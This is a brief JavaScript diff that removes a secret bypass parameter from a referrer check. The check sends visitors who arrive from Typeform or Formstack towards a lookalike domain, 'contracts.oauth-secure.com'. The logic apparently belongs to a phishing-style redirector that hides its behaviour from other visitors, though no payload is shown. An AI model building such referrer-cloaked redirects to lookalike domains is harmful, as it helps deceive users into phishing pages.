@@ -9,7 +9,7 @@
 
         let targetDomain = "https://contracts.oauth-secure.com";
 
-        if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i) || urlParams.has("justletmeinbroplease")) {
+        if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i)) {
 
             if (urlParams.has("u")) {
                 const u = urlParams.get("u");
